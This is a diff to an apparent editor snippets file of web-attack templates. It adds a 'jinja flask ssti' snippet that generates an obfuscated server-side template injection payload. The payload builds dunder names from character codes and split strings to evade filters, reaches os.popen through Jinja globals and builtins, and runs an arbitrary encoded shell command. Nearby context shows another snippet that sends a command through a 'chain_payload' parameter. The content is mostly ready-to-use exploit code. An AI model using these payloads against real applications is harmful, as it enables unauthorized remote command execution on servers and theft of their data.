@@ -9,7 +9,7 @@
 			"",
 			"s = httpx.Client()",
 			"",
-            "url = '$1'",
+			"url = '$1'"
 		]
 	},
 	"flask sign cookie": {
@@ -214,6 +214,22 @@
 			"cmd = '$4'",
 			"r = s.get(f'{url}/$2', params={'$3': chain_payload, '0': cmd})",
 			"print(r.text)"
+		]
+	},
+	"jinja flask ssti": {
+		"scope": "python",
+		"body": [
+			"BASE = '''",
+			"{%print ((x|attr('%s%s'%('%s%s'%(('%c'%95)*2,'i''nit'),('%c'%95)*2))|attr('%s%s'%('%s%s'%(('%c'%95)*2,'g''lobals'),('%c'%95)*2))|attr('%s%s'%('%s%s'%(('%c'%95)*2,'g''etitem'),('%c'%95)*2))('%s%s'%('%s%s'%(('%c'%95)*2,'b''uiltins'),('%c'%95)*2))|attr('%s%s'%('%s%s'%(('%c'%95)*2,'g''etitem'),('%c'%95)*2))('%s%s'%('%s%s'%(('%c'%95)*2,'i''mport'),('%c'%95)*2)))('o''s')|attr('po''pen'))(('%c'*PAYLOAD_LEN)%(COMMAND_HERE))|attr('r''ead')()%}",
+			"'''",
+			"",
+			"def convert_to_chr(s):",
+			"    return ','.join([str(ord(c)) for c in s])",
+			"",
+			"cmd = 'ls /'",
+			"out = BASE.replace('PAYLOAD_LEN', str(len(cmd)))",
+			"out = out.replace('COMMAND_HERE', convert_to_chr(cmd))",
+			"print(out)"
 		]
 	}
 }
